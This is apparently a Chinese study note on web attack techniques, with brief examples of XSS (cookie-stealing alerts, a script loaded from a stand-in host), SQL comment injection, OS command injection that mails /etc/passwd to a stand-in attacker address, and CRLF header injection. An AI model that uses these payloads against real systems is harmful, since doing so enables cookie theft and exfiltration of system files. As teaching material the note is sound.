# Web 攻击技术

## 因输出值转义不完全而引发的安全漏洞

### 跨站脚本攻击 | Cross-Site Scripting | XSS

* 跨站脚本攻击依赖动态脚本注入
1. 将输入 (input) 动态插入 html 中
```js
  <input type="text" id="username" name="username" />
  document.getElementsByTagName("body")[0].innerHTML = username;
  // username ===> "<script>alert(document.cookie)</script>
```
2. URL 查询字符串插入 表单 
```js
  // url ===> www.example.com/login?ID=yama
  // ID ===> "><script>alert(document.cookie)</script><span s="
  <form>
    ID <input type="text" value="ID"/>
  </form>
```
3. 动态插入 js 文件 (也是利用 url 插入)
```js
  <script src="http://hack.cn/xss.js"></script>
  // xss.js
  alert(document.cookie);
```

### SQL 注入攻击

1. SQL | -- 后均为注释
```js
  const url = 'http://example.com/search?q=村上春树' // 原本 
  const url = 'http://example.com/search?q=村上春树 -- ' // 注入攻击 
```
```SQL
  SELECT * FROM library WHERE author = '村上春树' and flag = 1
  SELECT * FROM library WHERE author = '村上春树' -- and flag = 1
```

### OS 命令注入攻击

1. web 启动 os 命令发送邮件
```bash
  my $adr = $q->param('mailaddress');
  open(MAIL, "| /usr/sbin/sendmail $adr");
  print MAIL "From: info@example.com\n";
```
```bash
  # 攻击代码 "; cat /etc/passwd | mail hack@example.cn"
  "| /usr/sbin/sendmail ; car /etc/passwd | mail hack@example.cn"
```

### HTTP 首部注入攻击 | HTTP Header Injection

```html
  <!-- http 报文格式 -->
  <line>
  <header>
  <blank-line>
  <body>
```

1. http 响应截断攻击

```html
  <!-- 插入两个换行符 达到改变报文主体的目的
       url 中 %0D%0A 会被解析成回车换行
       Location: http://example.com/?cat=101(%0D%0A: 换行符)
  -->
  %0D%0A%0D%0A<HTML><HEAD><TITLE>想要显示的内容<!--
```

